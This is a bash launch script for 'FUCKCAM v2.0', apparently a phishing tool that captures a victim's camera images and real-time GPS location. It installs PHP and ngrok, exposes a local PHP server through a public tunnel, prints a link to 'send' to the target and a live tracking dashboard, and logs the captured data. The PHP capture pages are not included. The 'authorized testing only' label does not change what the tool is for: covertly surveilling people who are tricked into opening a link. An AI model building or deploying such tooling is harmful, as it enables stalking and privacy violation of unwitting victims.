#!/bin/bash
# FUCKCAM - Setup & Launch Script
# Author: JUNMO
# Authorized Penetration Testing Tool Only

PURPLE='\033[0;35m'
CYAN='\033[0;36m'
GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m'

banner() {
    clear
    echo -e "${PURPLE}"
    echo "   ╔══════════════════════════════════════╗"
    echo "   ║         FUCKCAM v2.0                 ║"
    echo "   ║   Camera + Real-Time GPS Tracking    ║"
    echo "   ║   Authorized Security Testing Only   ║"
    echo "   ║         by JUNMO                     ║"
    echo "   ╚══════════════════════════════════════╝"
    echo -e "${NC}"
}

check_deps() {
    echo -e "${CYAN}[*] Checking dependencies...${NC}"
    
    if ! command -v php &> /dev/null; then
        echo -e "${RED}[!] PHP not found. Installing...${NC}"
        sudo apt update && sudo apt install php -y
    else
        echo -e "${GREEN}[✓] PHP is installed${NC}"
    fi

    if ! command -v ngrok &> /dev/null; then
        echo -e "${RED}[!] ngrok not found. Installing...${NC}"
        wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
        tar -xzf ngrok-v3-stable-linux-amd64.tgz
        sudo mv ngrok /usr/local/bin/ngrok
        rm ngrok-v3-stable-linux-amd64.tgz
        echo -e "${CYAN}[!] Please configure ngrok: ngrok config add-authtoken YOUR_TOKEN${NC}"
        echo -e "${CYAN}[!] Get token at: https://dashboard.ngrok.com${NC}"
        read -p "[?] Enter your ngrok authtoken: " NGROK_TOKEN
        ngrok config add-authtoken "$NGROK_TOKEN"
        echo -e "${GREEN}[✓] ngrok installed & configured${NC}"
    else
        echo -e "${GREEN}[✓] ngrok is installed${NC}"
    fi
}

setup_dirs() {
    echo -e "${CYAN}[*] Setting up directories...${NC}"
    mkdir -p logs
    chmod 755 logs
    echo -e "${GREEN}[✓] logs/ directory created${NC}"
}

start_php_server() {
    echo -e "${CYAN}[*] Starting PHP server on port 8080...${NC}"
    php -S 0.0.0.0:8080 > /dev/null 2>&1 &
    PHP_PID=$!
    echo -e "${GREEN}[✓] PHP server running (PID: $PHP_PID)${NC}"
}

start_ngrok() {
    echo -e "${CYAN}[*] Starting ngrok tunnel on port 8080...${NC}"
    ngrok http 8080 > /dev/null 2>&1 &
    NGROK_PID=$!
    sleep 3
    NGROK_URL=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o '"public_url":"https://[^"]*' | head -1 | cut -d'"' -f4)
    echo -e "${GREEN}[✓] ngrok running (PID: $NGROK_PID)${NC}"
    echo -e "${GREEN}[✓] Public URL: ${NGROK_URL}${NC}"
    echo ""
    echo -e "${PURPLE}─────────────────────────────────────────────${NC}"
    echo -e "${CYAN}  FUCKCAM by JUNMO — Send this link:${NC}"
    echo -e "${GREEN}  $NGROK_URL${NC}"
    echo ""
    echo -e "${CYAN}  Open DASHBOARD to track live:${NC}"
    echo -e "${GREEN}  $NGROK_URL/ip.php${NC}"
    echo -e "${PURPLE}─────────────────────────────────────────────${NC}"
    echo ""
    echo -e "${CYAN}[*] Captured data will appear in logs/ directory${NC}"
    echo -e "${CYAN}[*] Press Ctrl+C to stop all services${NC}"
}

cleanup() {
    echo -e "\n${RED}[!] Shutting down...${NC}"
    kill $PHP_PID 2>/dev/null
    kill $NGROK_PID 2>/dev/null
    pkill -f "ngrok http 8080" 2>/dev/null
    pkill -f "php -S 0.0.0.0:8080" 2>/dev/null
    echo -e "${GREEN}[✓] Services stopped${NC}"
    exit 0
}

# Main
trap cleanup SIGINT SIGTERM

banner
echo -e "${CYAN}[*] Starting FUCKCAM by JUNMO...${NC}"
echo ""

check_deps
setup_dirs
start_php_server
start_ngrok

# Keep running
while true; do
    sleep 1
done